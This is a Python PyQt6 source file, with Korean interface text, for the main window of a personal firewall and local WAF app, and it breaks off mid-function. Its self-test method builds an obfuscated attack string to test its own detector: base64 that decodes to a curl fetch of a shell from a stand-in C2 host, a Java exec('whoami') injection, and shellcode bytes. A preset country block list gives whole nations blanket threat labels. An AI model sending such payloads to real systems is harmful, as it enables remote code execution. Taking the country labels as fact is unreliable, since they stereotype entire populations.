import sys
import os
import csv
import time
import threading
from PyQt6.QtWidgets import (
    QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QLabel,
    QPushButton, QTabWidget, QTableWidget, QTableWidgetItem,
    QHeaderView, QLineEdit, QListWidget, QCheckBox, QFrame,
    QFileDialog, QMessageBox, QSystemTrayIcon, QMenu,
    QInputDialog, QApplication, QTextEdit, QComboBox, QDialog
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject
from PyQt6.QtGui import QColor, QFont, QIcon, QAction, QPixmap, QPainter

from core.config import ShieldConfig
from core.geoip import GeoIPLookup
from core.ai_engine import AIBehavioralEngine
from core.waf_proxy import LocalWAFProxy
from core.net_monitor import NetworkConnectionMonitor
from core.file_guard import FileIntegrityGuard
from core.firewall_manager import (
    sync_inbound_block_rule, sync_port_block_rule,
    delete_shield_rule, get_shield_firewall_details,
    INBOUND_BLOCK_RULE, PORT_BLOCK_RULE
)
from core.startup_manager import is_startup_enabled, set_startup_enabled
from ui.material_theme import NORTON_WIN11_STYLE
from ui.components import MaterialSwitch, LiveTrafficChart, MetricKpiCard

APP_VERSION = "V1.0.2"

class SignalBridge(QObject):
    log_received = pyqtSignal(dict)
    alert_received = pyqtSignal(dict)
    traffic_updated = pyqtSignal(float, float)
    firewall_synced = pyqtSignal(list)

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"Jinkero Shield 개인용 방화벽 & 로컬 WAF ({APP_VERSION})")
        self.resize(1120, 780)
        self.setMinimumSize(960, 640)
        self.setStyleSheet(NORTON_WIN11_STYLE)

        self.bridge = SignalBridge()
        self.bridge.log_received.connect(self.add_log_entry)
        self.bridge.alert_received.connect(self.show_file_alert)
        self.bridge.traffic_updated.connect(self.on_traffic_update)
        self.bridge.firewall_synced.connect(self._on_firewall_details_ready)

        # 코어 초기화
        self.config = ShieldConfig()
        self.geoip = GeoIPLookup()
        self.ai_engine = AIBehavioralEngine(
            sensitivity=self.config.ai_sensitivity,
            auto_block=self.config.ai_enabled
        )

        # 로그 저장소 및 필터 모드
        self.all_logs = []
        self.displayed_logs = []
        self.current_filter_mode = "ALL"
        self.selected_log_entry = None

        # 통계 카운터 초기화
        self.stat_total_inspected = 0
        self.stat_threats_blocked = len(self.config.threat_blocked_history)
        self.stat_geo_blocked = len(self.config.geo_blocked_history)

        # 1. 이전 실행에서 누적 저장된 확실한 침해 시도 내역 복원 (재실행 시에도 유지)
        for t_item in self.config.threat_blocked_history:
            self.all_logs.append({
                "timestamp": t_item.get("timestamp", ""),
                "ip": t_item.get("ip", ""),
                "country": t_item.get("country", ""),
                "method": "RESTORED",
                "path": "영구 차단 유지됨",
                "action": "BLOCKED",
                "rule": t_item.get("rule", "THREAT_DEFENSE"),
                "ai_score": 95,
                "details": t_item.get("details", "")
            })

        self.waf = LocalWAFProxy(
            listen_port=self.config.waf_port,
            target_port=self.config.target_port,
            config=self.config,
            geoip=self.geoip,
            ai_engine=self.ai_engine,
            log_callback=self.bridge.log_received.emit
        )
        self.net_monitor = NetworkConnectionMonitor(
            config=self.config,
            geoip=self.geoip,
            ai_engine=self.ai_engine,
            log_callback=self.bridge.log_received.emit,
            traffic_callback=self.bridge.traffic_updated.emit
        )
        self.file_guard = FileIntegrityGuard(
            alert_callback=self.bridge.alert_received.emit
        )

        self._init_ui()
        self._init_system_tray()
        self._start_services()

        # 최초 시작 시 백그라운드 스레드로 방화벽(Jinkero_Block_Ips) 동기화 (UI 블로킹 방지)
        self._async_sync_firewall_rules()

        # 네트워크 순위 갱신 타이머 (2초 주기)
        self.rank_timer = QTimer(self)
        self.rank_timer.timeout.connect(self._refresh_network_ranks)
        self.rank_timer.start(2000)

    def _init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root_layout = QVBoxLayout(central)
        root_layout.setContentsMargins(20, 14, 20, 12)
        root_layout.setSpacing(12)

        # 1. 상단 헤더 & 마스터 스위치
        header_card = QFrame()
        header_card.setObjectName("HeaderCard")
        h_layout = QHBoxLayout(header_card)
        h_layout.setContentsMargins(18, 12, 18, 12)

        title_box = QVBoxLayout()
        title_bar = QHBoxLayout()
        title = QLabel("🛡️ Jinkero Shield 개인용 방화벽 & 로컬 WAF")
        title.setObjectName("HeaderTitle")
        
        ver_badge = QLabel(f" {APP_VERSION} AI ")
        ver_badge.setStyleSheet("background-color: #F59E0B; color: #0F172A; font-size: 11px; font-weight: 800; border-radius: 4px; padding: 2px 6px; margin-left: 6px;")
        
        title_bar.addWidget(title)
        title_bar.addWidget(ver_badge)
        title_bar.addStretch()
        
        sub_title = QLabel("Windows 11 실시간 연동 (Jinkero_Block_Ips) • 정밀 AI 자율 방어 (확실한 위협만 선별 차단) • 금융권 APT 원천 방어")
        sub_title.setStyleSheet("color: #94A3B8; font-size: 13px; font-weight: 500;")
        title_box.addLayout(title_bar)
        title_box.addWidget(sub_title)
        h_layout.addLayout(title_box)

        h_layout.addStretch()

        # 윈도우 시작 시 자동 실행 (트레이 모드) 체크박스
        self.chk_startup = QCheckBox("윈도우 시작 시 자동 실행 (트레이)")
        self.chk_startup.setStyleSheet("color: #CBD5E1; font-size: 13px; font-weight: 600;")
        self.chk_startup.setChecked(is_startup_enabled())
        self.chk_startup.toggled.connect(self._toggle_startup)
        h_layout.addWidget(self.chk_startup)

        h_layout.addSpacing(22)

        self.status_lbl = QLabel("보호 상태: 실시간 활성화됨" if self.config.is_active else "보호 상태: 일시 중지됨")
        self.status_lbl.setStyleSheet("font-size: 14px; font-weight: 700; color: #38BDF8;" if self.config.is_active else "font-size: 14px; font-weight: 700; color: #94A3B8;")
        
        self.master_switch = MaterialSwitch(checked=self.config.is_active)
        self.master_switch.mousePressEvent = self._toggle_master_switch
        
        h_layout.addWidget(self.status_lbl)
        h_layout.addSpacing(12)
        h_layout.addWidget(self.master_switch)
        root_layout.addWidget(header_card)

        # 2. 모던 미니멀 KPI 카드 4종
        stats_layout = QHBoxLayout()
        stats_layout.setSpacing(12)

        self.kpi_inspected = MetricKpiCard("총 검사된 트래픽", "0", "전체 패킷 및 AI 감시", theme="blue")
        self.kpi_inspected.mousePressEvent = lambda e: self._filter_logs_by_mode("ALL")

        self.kpi_threats = MetricKpiCard("차단된 지능형 침해 시도", str(self.stat_threats_blocked), "클릭 시 차단 내역만 필터", theme="red")
        self.kpi_threats.mousePressEvent = lambda e: self._filter_logs_by_mode("BLOCKED_ONLY")

        self.kpi_geo = MetricKpiCard("차단된 IP 및 국가 목록", f"{len(self.config.black_ips)}건", "차단 IP 관리 바로가기", theme="amber")
        self.kpi_geo.mousePressEvent = lambda e: self.tabs.setCurrentIndex(2)

        self.kpi_win_fw = MetricKpiCard("Windows 방화벽 연동", "Jinkero_Block_Ips", "방화벽 설정 편집/삭제", theme="green")
        self.kpi_win_fw.mousePressEvent = lambda e: self.tabs.setCurrentIndex(4)

        stats_layout.addWidget(self.kpi_inspected)
        stats_layout.addWidget(self.kpi_threats)
        stats_layout.addWidget(self.kpi_geo)
        stats_layout.addWidget(self.kpi_win_fw)
        root_layout.addLayout(stats_layout)

        # 3. 실시간 RX/TX 네트워크 대역폭 모니터링 차트 (과부하 시 점멸 경고)
        chart_card = QFrame()
        chart_card.setObjectName("Card")
        c_layout = QVBoxLayout(chart_card)
        c_layout.setContentsMargins(16, 10, 16, 10)
        c_layout.setSpacing(4)

        c_header = QHBoxLayout()
        c_title = QLabel("📊 실시간 네트워크 송수신 모니터링 (과부하 발생 시 자동 점멸 경고)")
        c_title.setObjectName("CardTitle")
        c_header.addWidget(c_title)
        c_header.addStretch()
        c_layout.addLayout(c_header)

        self.traffic_chart = LiveTrafficChart()
        c_layout.addWidget(self.traffic_chart)
        root_layout.addWidget(chart_card)

        # 4. 탭 구성 (AI 자율 방어 탭 포함)
        self.tabs = QTabWidget()
        self.tabs.addTab(self._build_log_tab(), "📋 접근 로그")
        self.tabs.addTab(self._build_ai_defense_tab(), "🤖 AI 자율 방어")
        self.tabs.addTab(self._build_rules_tab(), "🚫 차단 목록")
        self.tabs.addTab(self._build_security_tab(), "🛡️ 금융 APT 방어")
        self.tabs.addTab(self._build_firewall_manager_tab(), "⚙️ 방화벽 설정")
        self.tabs.addTab(self._build_network_rank_tab(), "🏆 트래픽 순위")
        root_layout.addWidget(self.tabs, 1)

        # 5. 하단 저작권 및 상태 표시줄 (Copyright)
        footer_layout = QHBoxLayout()
        footer_lbl = QLabel("All Copyright Reserved by JINKERO 2026")
        footer_lbl.setStyleSheet("color: #64748B; font-size: 11px; font-weight: 500;")
        footer_layout.addStretch()
        footer_layout.addWidget(footer_lbl)
        footer_layout.addStretch()
        root_layout.addLayout(footer_layout)

    def _build_log_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(8, 10, 8, 8)
        layout.setSpacing(8)

        bar = QHBoxLayout()
        self.log_mode_label = QLabel("전체 트래픽 스트림 (총 0건) — 💡 표의 행을 클릭하면 하단에 상세 분석 정보가 표시됩니다.")
        self.log_mode_label.setStyleSheet("font-weight: 700; color: #FBBF24; font-size: 13px;")
        bar.addWidget(self.log_mode_label)

        bar.addSpacing(12)
        self.btn_show_all = QPushButton("전체 로그 보기")
        self.btn_show_all.setObjectName("SecondaryButton")
        self.btn_show_all.clicked.connect(lambda: self._filter_logs_by_mode("ALL"))
        bar.addWidget(self.btn_show_all)

        self.btn_show_blocked = QPushButton("차단된 침해 내역만 보기")
        self.btn_show_blocked.setObjectName("DangerButton")
        self.btn_show_blocked.clicked.connect(lambda: self._filter_logs_by_mode("BLOCKED_ONLY"))
        bar.addWidget(self.btn_show_blocked)

        bar.addStretch()

        export_btn = QPushButton("CSV 내보내기")
        export_btn.setObjectName("SecondaryButton")
        export_btn.clicked.connect(self._export_logs_csv)
        bar.addWidget(export_btn)

        clear_btn = QPushButton("로그 비우기")
        clear_btn.setObjectName("SecondaryButton")
        clear_btn.clicked.connect(self._clear_logs)
        bar.addWidget(clear_btn)

        layout.addLayout(bar)

        self.table = QTableWidget(0, 8)
        self.table.setHorizontalHeaderLabels(["일시", "출발지 IP", "국가", "타깃/프로세스", "액션", "AI 위협점수", "탐지 규칙", "세부 위협 내역 (클릭 시 상세보기)"])
        self.table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self.table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        header = self.table.horizontalHeader()
        header.setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(5, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(7, QHeaderView.ResizeMode.Stretch)
        self.table.setColumnWidth(0, 130)
        self.table.setColumnWidth(1, 120)
        self.table.setColumnWidth(2, 55)
        self.table.setColumnWidth(3, 140)
        self.table.setColumnWidth(4, 90)
        self.table.setColumnWidth(5, 85)
        self.table.setColumnWidth(6, 150)
        self.table.cellClicked.connect(self._on_log_row_clicked)
        self.table.cellDoubleClicked.connect(self._on_log_row_double_clicked)
        layout.addWidget(self.table, 3)

        # 하단: 선택된 행 상세 보기 인스펙터 패널
        detail_card = QFrame()
        detail_card.setObjectName("Card")
        detail_card.setStyleSheet(
            "QFrame#Card { background-color: #0F172A; border: 1px solid #334155; border-radius: 10px; }"
        )
        d_layout = QVBoxLayout(detail_card)
        d_layout.setContentsMargins(14, 10, 14, 10)
        d_layout.setSpacing(6)

        d_top = QHBoxLayout()
        self.detail_title_lbl = QLabel("🔍 선택한 로그 상세 분석 (위 표에서 원하는 행을 클릭하세요)")
        self.detail_title_lbl.setStyleSheet("color: #38BDF8; font-weight: 700; font-size: 13px;")
        d_top.addWidget(self.detail_title_lbl)
        d_top.addStretch()

        self.btn_detail_whitelist = QPushButton("✅ 이 IP 차단 해제 & 신뢰(WhiteIP) 등록")
        self.btn_detail_whitelist.setObjectName("SuccessButton")
        self.btn_detail_whitelist.setEnabled(False)
        self.btn_detail_whitelist.clicked.connect(self._whitelist_selected_log_ip)
        d_top.addWidget(self.btn_detail_whitelist)

        self.btn_detail_blacklist = QPushButton("🚫 이 IP 즉시 차단(BlackIP) 등록")
        self.btn_detail_blacklist.setObjectName("DangerButton")
        self.btn_detail_blacklist.setEnabled(False)
        self.btn_detail_blacklist.clicked.connect(self._blacklist_selected_log_ip)
        d_top.addWidget(self.btn_detail_blacklist)

        self.btn_detail_popup = QPushButton("🔎 팝업 창으로 크게 보기")
        self.btn_detail_popup.setObjectName("SecondaryButton")
        self.btn_detail_popup.setEnabled(False)
        self.btn_detail_popup.clicked.connect(self._open_selected_log_modal)
        d_top.addWidget(self.btn_detail_popup)

        d_layout.addLayout(d_top)

        self.detail_text = QTextEdit()
        self.detail_text.setReadOnly(True)
        self.detail_text.setMaximumHeight(92)
        self.detail_text.setPlaceholderText("표의 행을 클릭하면 출발지 IP, 국가, 프로세스 경로, 포트 정보, AI 위협 점수 및 전체 XAI 판정 사유가 이곳에 상세히 표시됩니다. (더블클릭 시 상세 팝업 오픈)")
        self.detail_text.setStyleSheet(
            "background-color: #1E293B; color: #F1F5F9; border: 1px solid #334155; "
            "border-radius: 6px; padding: 6px 10px; font-size: 12px; font-family: 'Malgun Gothic', 'Consolas', sans-serif;"
        )
        d_layout.addWidget(self.detail_text)

        layout.addWidget(detail_card, 1)

        self._render_log_table()
        return widget

    def _on_log_row_clicked(self, row: int, col: int = 0):
        if row < 0 or row >= len(self.displayed_logs):
            return
        entry = self.displayed_logs[row]
        self.selected_log_entry = entry

        ip = entry.get("ip", "")
        country = entry.get("country", "")
        action = entry.get("action", "")
        rule = entry.get("rule", "")
        ai_score = entry.get("ai_score", 0)
        ts = entry.get("timestamp", "")
        target = f"{entry.get('method', '')} {entry.get('path', '')}"
        proc_exe = entry.get("proc_exe", "")
        details = entry.get("details", "")

        self.detail_title_lbl.setText(
            f"🔍 상세 분석 | IP: {ip} ({country})  •  액션: {action}  •  AI 위협점수: {ai_score}점  •  규칙: {rule}"
        )
        self.btn_detail_whitelist.setEnabled(bool(ip and ip not in ("127.0.0.1", "::1")))
        self.btn_detail_blacklist.setEnabled(bool(ip and ip not in ("127.0.0.1", "::1")))
        self.btn_detail_popup.setEnabled(True)

        exe_line = f" | 실행 파일 경로: {proc_exe}" if proc_exe else ""
        html = (
            f"<div style='line-height: 1.5;'>"
            f"<b>• 발생 일시:</b> {ts} &nbsp;&nbsp;|&nbsp;&nbsp; "
            f"<b>• 출발지 IP / 국가:</b> <span style='color:#38BDF8; font-weight:bold;'>{ip} ({country})</span> &nbsp;&nbsp;|&nbsp;&nbsp; "
            f"<b>• 타깃 / 프로세스:</b> {target}{exe_line}<br/>"
            f"<b>• 판정 액션:</b> <span style='color:{'#EF4444' if 'BLOCK' in action else '#10B981'}; font-weight:bold;'>{action}</span> &nbsp;&nbsp;|&nbsp;&nbsp; "
            f"<b>• AI 위협 점수:</b> <span style='color:#FBBF24; font-weight:bold;'>{ai_score} / 100점</span> &nbsp;&nbsp;|&nbsp;&nbsp; "
            f"<b>• 적용 규칙:</b> {rule}<br/>"
            f"<b>• 세부 위협 내역 전문:</b> <span style='color:#E2E8F0;'>{details}</span>"
            f"</div>"
        )
        self.detail_text.setHtml(html)

    def _on_log_row_double_clicked(self, row: int, col: int = 0):
        self._on_log_row_clicked(row, col)
        self._open_selected_log_modal()

    def _open_selected_log_modal(self):
        if not self.selected_log_entry:
            return
        entry = self.selected_log_entry
        dlg = QDialog(self)
        dlg.setWindowTitle(f"로그 상세 분석 리포트 — {entry.get('ip', '')}")
        dlg.resize(680, 440)
        dlg.setStyleSheet(NORTON_WIN11_STYLE)

        vbox = QVBoxLayout(dlg)
        vbox.setContentsMargins(20, 18, 20, 18)
        vbox.setSpacing(12)

        hdr = QLabel(f"🛡️ 패킷 / 연결 상세 보안 분석 리포트")
        hdr.setStyleSheet("font-size: 16px; font-weight: 800; color: #FBBF24;")
        vbox.addWidget(hdr)

        report_box = QTextEdit()
        report_box.setReadOnly(True)
        report_box.setStyleSheet(
            "background-color: #0F172A; color: #F8FAFC; border: 1px solid #334155; "
            "border-radius: 8px; padding: 14px; font-size: 13px; line-height: 1.6;"
        )
        proc_exe = entry.get("proc_exe", "N/A")
        remote_port = entry.get("remote_port", "N/A")
        local_port = entry.get("local_port", "N/A")
        pid = entry.get("pid", "N/A")

        report_html = f"""
        <div style="font-family: 'Malgun Gothic', sans-serif; line-height: 1.7;">
            <p><b>1. 발생 일시:</b> {entry.get('timestamp', '')}</p>
            <p><b>2. 출발지/원격 IP 주소:</b> <span style="color:#38BDF8; font-weight:bold;">{entry.get('ip', '')}</span> (국가 코드: <b>{entry.get('country', '')}</b>)</p>
            <p><b>3. 프로토콜 / 포트 정보:</b> {entry.get('method', '')} (로컬 포트: {local_port} ↔ 원격 포트: {remote_port})</p>
            <p><b>4. 대상 프로세스 / 경로:</b> {entry.get('path', '')} (PID: {pid})<br/>
               <span style="color:#94A3B8; font-size:12px;">실행 경로: {proc_exe}</span></p>
            <p><b>5. 방화벽 조치 상태:</b> <span style="color:{'#EF4444' if 'BLOCK' in entry.get('action', '') else '#10B981'}; font-weight:bold;">{entry.get('action', '')}</span></p>
            <p><b>6. AI 위협 점수 및 탐지 규칙:</b> <span style="color:#FBBF24; font-weight:bold;">{entry.get('ai_score', 0)} / 100점</span> ({entry.get('rule', '')})</p>
            <hr style="border: 1px solid #334155;"/>
            <p><b>7. 상세 위협 분석 및 XAI 판정 사유 전문:</b><br/>
            <span style="color:#E2E8F0;">{entry.get('details', '')}</span></p>
        </div>
        """
        report_box.setHtml(report_html)
        vbox.addWidget(report_box)

        btn_bar = QHBoxLayout()
        ip = entry.get("ip", "")
        if ip and ip not in ("127.0.0.1", "::1"):
            w_btn = QPushButton("✅ 이 IP 차단 해제 & 신뢰(WhiteIP) 등록")
            w_btn.setObjectName("SuccessButton")
            w_btn.clicked.connect(lambda: (self._whitelist_selected_log_ip(), dlg.accept()))
            btn_bar.addWidget(w_btn)

            b_btn = QPushButton("🚫 이 IP 영구 차단(BlackIP) 등록")
            b_btn.setObjectName("DangerButton")
            b_btn.clicked.connect(lambda: (self._blacklist_selected_log_ip(), dlg.accept()))
            btn_bar.addWidget(b_btn)

        btn_bar.addStretch()
        close_btn = QPushButton("닫기")
        close_btn.setObjectName("SecondaryButton")
        close_btn.clicked.connect(dlg.accept)
        btn_bar.addWidget(close_btn)
        vbox.addLayout(btn_bar)

        dlg.exec()

    def _whitelist_selected_log_ip(self):
        if not self.selected_log_entry:
            return
        ip = self.selected_log_entry.get("ip", "").strip()
        if not ip or ip in ("127.0.0.1", "::1"):
            return
        self.config.remove_black_ip(ip)
        self.config.add_white_ip(ip)
        # 기존 차단 기록에서도 제거하여 재차단 방지
        self.config.threat_blocked_history = [x for x in self.config.threat_blocked_history if x.get("ip") != ip]
        self.config.ai_anomaly_history = [x for x in self.config.ai_anomaly_history if x.get("ip") != ip]
        self.config.save()

        self._async_sync_firewall_rules()
        self._refresh_black_list_ui()
        self.white_list.clear()
        for wip in sorted(list(self.config.white_ips)):
            self.white_list.addItem(wip)
        QMessageBox.information(self, "신뢰 IP 등록 완료", f"IP [{ip}]가 차단 해제되어 신뢰 목록(WhiteIP)에 등록되었으며,\nWindows 방화벽(Jinkero_Block_Ips)에서도 즉시 제외되었습니다.")

    def _blacklist_selected_log_ip(self):
        if not self.selected_log_entry:
            return
        ip = self.selected_log_entry.get("ip", "").strip()
        if not ip or ip in ("127.0.0.1", "::1"):
            return
        self.config.add_black_ip(ip)
        now_str = time.strftime("%Y-%m-%d %H:%M:%S")
        self.config.record_threat_block(ip, self.selected_log_entry.get("country", "UNKNOWN"), now_str, "MANUAL_BLOCK", "사용자 수동 영구 차단")
        self._async_sync_firewall_rules()
        self._refresh_black_list_ui()
        QMessageBox.information(self, "영구 차단 등록 완료", f"IP [{ip}]가 BlackIP 및 Windows 방화벽(Jinkero_Block_Ips)에 즉시 차단 등록되었습니다.")

    def _build_ai_defense_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(10, 12, 10, 10)
        layout.setSpacing(12)

        # 상단 제어 바
        ctrl_card = QFrame()
        ctrl_card.setObjectName("Card")
        ctrl_layout = QHBoxLayout(ctrl_card)
        ctrl_layout.setContentsMargins(16, 12, 16, 12)

        self.chk_ai_enable = QCheckBox("🤖 온디바이스 AI 자율 방어 활성화 (확실한 고위험 침투만 선별 차단)")
        self.chk_ai_enable.setChecked(self.config.ai_enabled)
        self.chk_ai_enable.setStyleSheet("font-weight: 700; color: #38BDF8; font-size: 13px;")
        self.chk_ai_enable.toggled.connect(self._toggle_ai_engine)
        ctrl_layout.addWidget(self.chk_ai_enable)

        ctrl_layout.addSpacing(20)
        sens_lbl = QLabel("AI 민감도 모드:")
        sens_lbl.setStyleSheet("color: #CBD5E1; font-weight: 600;")
        ctrl_layout.addWidget(sens_lbl)

        self.combo_ai_sens = QComboBox()
        self.combo_ai_sens.addItems([
            "BALANCED (균형 권장 - 확실한 위협 90점 이상만 차단)",
            "CONSERVATIVE (보수적 - 초고위험 95점 이상만 차단)",
            "AGGRESSIVE (공격적 금융보안 - 82점 이상 차단)"
        ])
        sens_map = {"BALANCED": 0, "CONSERVATIVE": 1, "AGGRESSIVE": 2}
        self.combo_ai_sens.setCurrentIndex(sens_map.get(self.config.ai_sensitivity, 0))
        self.combo_ai_sens.setStyleSheet(
            "background-color: #1E293B; color: #F8FAFC; border: 1px solid #334155; "
            "border-radius: 6px; padding: 5px 10px; font-weight: 600;"
        )
        self.combo_ai_sens.currentIndexChanged.connect(self._change_ai_sensitivity)
        ctrl_layout.addWidget(self.combo_ai_sens)

        ctrl_layout.addStretch()

        sim_btn = QPushButton("🧪 AI 변종 공격 모의 검증")
        sim_btn.setObjectName("SecondaryButton")
        sim_btn.clicked.connect(self._run_ai_simulation_test)
        ctrl_layout.addWidget(sim_btn)

        clear_ai_btn = QPushButton("AI 기록 비우기")
        clear_ai_btn.setObjectName("SecondaryButton")
        clear_ai_btn.clicked.connect(self._clear_ai_history)
        ctrl_layout.addWidget(clear_ai_btn)

        layout.addWidget(ctrl_card)

        # 중단: 알고리즘 아키텍처 설명 배너
        info_lbl = QLabel(
            "💡 [오탐 방지 정밀 AI 튜닝 적용] 일반 브라우저/메신저/클라우드 임시 포트(>=10000) 통신은 안전하게 통과시키며, "
            "고엔트로피 H(X) + 공격 N-gram이 결합된 실제 쉘코드/웹셸 및 서비스 포트 스윕(90점 이상)만 선별 차단합니다. (행 더블클릭 시 상세 팝업)"
        )
        info_lbl.setStyleSheet("color: #94A3B8; font-size: 12px; padding: 2px 4px;")
        layout.addWidget(info_lbl)

        # 하단: AI 이상 징후 및 자율 차단 분석 테이블 (XAI)
        self.ai_table = QTableWidget(0, 6)
        self.ai_table.setHorizontalHeaderLabels([
            "탐지 일시", "출발지 IP", "국가", "AI 위협 점수", "AI 탐지 모델 분류", "XAI 한국어 판정 사유 (더블클릭 시 상세보기)"
        ])
        self.ai_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.ai_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        ai_hdr = self.ai_table.horizontalHeader()
        ai_hdr.setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        ai_hdr.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        ai_hdr.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        ai_hdr.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        ai_hdr.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        ai_hdr.setSectionResizeMode(5, QHeaderView.ResizeMode.Stretch)
        self.ai_table.setColumnWidth(0, 140)
        self.ai_table.setColumnWidth(1, 125)
        self.ai_table.setColumnWidth(2, 60)
        self.ai_table.setColumnWidth(3, 95)
        self.ai_table.setColumnWidth(4, 175)
        self.ai_table.cellDoubleClicked.connect(self._on_ai_row_double_clicked)
        layout.addWidget(self.ai_table)

        self._refresh_ai_history_table()
        return widget

    def _on_ai_row_double_clicked(self, row: int, col: int = 0):
        records = self.config.ai_anomaly_history
        if 0 <= row < len(records):
            rec = records[row]
            QMessageBox.information(
                self, f"AI 탐지 상세 내역 — {rec.get('ip', '')}",
                f"• 탐지 일시: {rec.get('timestamp', '')}\n"
                f"• 출발지 IP: {rec.get('ip', '')} ({rec.get('country', '')})\n"
                f"• AI 위협 점수: {rec.get('score', '')} / 100점\n"
                f"• 탐지 분류: {rec.get('category', '')}\n"
                f"• 조치 상태: {rec.get('action', '')}\n\n"
                f"• XAI 상세 판정 사유:\n{rec.get('xai_reason', '')}"
            )

    def _toggle_ai_engine(self, checked: bool):
        self.config.ai_enabled = checked
        self.ai_engine.auto_block = checked
        self.config.save()

    def _change_ai_sensitivity(self, idx: int):
        modes = ["BALANCED", "CONSERVATIVE", "AGGRESSIVE"]
        mode = modes[idx] if 0 <= idx < len(modes) else "BALANCED"
        self.config.ai_sensitivity = mode
        self.ai_engine.set_sensitivity(mode)
        self.config.save()

    def _run_ai_simulation_test(self):
        """AI 엔진의 샤넌 엔트로피 + N-gram 난독화 제로데이 탐지 성능을 즉시 검증"""
        test_ip = "198.51.100.77"
        obfuscated_payload = "/api/v1/auth?token=eval(base64_decode('ZWNobyBjdXJsIGh0dHA6Ly9jMi5ldmlsLmNvbS9zaGVsbC5qc3A='))&cmd=%24%7Bruntime.getRuntime().exec('whoami')%7D"
        res = self.ai_engine.analyze_http_request(
            test_ip, "POST", obfuscated_payload,
            {"User-Agent": "Mozilla/5.0 (AI-ZeroDay-Sim)"},
            body="0x41414141\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76\\x08"
        )
        now_str = time.strftime("%Y-%m-%d %H:%M:%S")
        self.config.record_ai_anomaly(test_ip, "TEST", now_str, res.score, res.category, res.xai_reason, res.is_blocked)
        if res.is_blocked:
            self.config.record_threat_block(test_ip, "TEST", now_str, res.category, res.xai_reason)
            self._async_sync_firewall_rules()
            self._refresh_black_list_ui()

        self.add_log_entry({
            "timestamp": now_str,
            "ip": test_ip,
            "country": "TEST",
            "method": "AI_SIM",
            "path": "/api/v1/auth (난독화 제로데이 테스트)",
            "action": "BLOCKED_AI" if res.is_blocked else "ALERT_AI",
            "rule": res.category,
            "ai_score": res.score,
            "details": res.xai_reason
        })
        self._refresh_ai_history_table()
        QMessageBox.information(
            self, "AI 자율 방어 검증 완료",
            f"모의 난독화 공격 패킷 분석 결과:\n\n"
            f"• 출발지 IP: {test_ip} (테스트용 예약 대역)\n"
            f"• 산출된 AI 위협 점수: {res.score} / 100점\n"
            f"• 탐지 분류: {res.category}\n"
            f"• XAI 판정 사유:\n  {res.xai_reason}\n\n"
            f"Windows 방화벽 'Jinkero_Block_Ips' 규칙에 자동 반영되었습니다."
        )

    def _refresh_ai_history_table(self):
        if not hasattr(self, "ai_table"):
            return
        records = self.config.ai_anomaly_history
        self.ai_table.setRowCount(len(records))
        for r, rec in enumerate(records):
            self.ai_table.setItem(r, 0, QTableWidgetItem(rec.get("timestamp", "")))
            ip_item = QTableWidgetItem(rec.get("ip", ""))
            ip_item.setForeground(QColor("#EF4444"))
            self.ai_table.setItem(r, 1, ip_item)
            self.ai_table.setItem(r, 2, QTableWidgetItem(rec.get("country", "")))

            score_val = int(rec.get("score", 0))
            score_item = QTableWidgetItem(f"{score_val}점")
            score_item.setForeground(QColor("#EF4444" if score_val >= 85 else "#F59E0B"))
            self.ai_table.setItem(r, 3, score_item)

            self.ai_table.setItem(r, 4, QTableWidgetItem(rec.get("category", "")))
            self.ai_table.setItem(r, 5, QTableWidgetItem(rec.get("xai_reason", "")))

    def _clear_ai_history(self):
        self.config.ai_anomaly_history.clear()
        self.config.save()
        self._refresh_ai_history_table()

    PRESET_COUNTRIES = [
        ("CN", "중국 (CN) - 금융 APT/웹셸"),
        ("RU", "러시아 (RU) - 랜섬웨어/무차별대입"),
        ("KP", "북한 (KP) - 주요 인프라 타깃"),
        ("IR", "이란 (IR) - 기간망 스캐닝"),
        ("VN", "베트남 (VN) - 봇넷/크리덴셜"),
        ("IN", "인도 (IN) - 대규모 포트스캔"),
        ("BR", "브라질 (BR) - 금융 악성코드"),
        ("RO", "루마니아 (RO) - 공격 경유지"),
        ("UA", "우크라이나 (UA) - 방탄 호스팅"),
        ("BY", "벨라루스 (BY) - 동유럽 봇넷"),
        ("NG", "나이지리아 (NG) - 피싱/스캠"),
        ("PK", "파키스탄 (PK) - 취약점 탐색"),
    ]

    def _build_rules_tab(self) -> QWidget:
        widget = QWidget()
        layout = QHBoxLayout(widget)
        layout.setContentsMargins(10, 12, 10, 10)
        layout.setSpacing(16)

        # 좌측: 다중 국가 선택 그리드 + 사용자 국가 코드 직접 추가/관리
        left_card = QFrame()
        left_card.setObjectName("Card")
        l_box = QVBoxLayout(left_card)
        l_box.setContentsMargins(16, 14, 16, 14)
        l_box.setSpacing(8)
        
        l_title = QLabel("🌏 국가별 접근 차단 (GeoIP 다중 선택 & 코드 추가)")
        l_title.setObjectName("CardTitle")
        l_box.addWidget(l_title)

        desc = QLabel("주요 공격 다발 국가를 체크하거나, 2자리 ISO 국가 코드(예: US, HK, NL, SG)를 직접 입력해 차단할 수 있습니다.")
        desc.setStyleSheet("color: #94A3B8; font-size: 12px;")
        desc.setWordWrap(True)
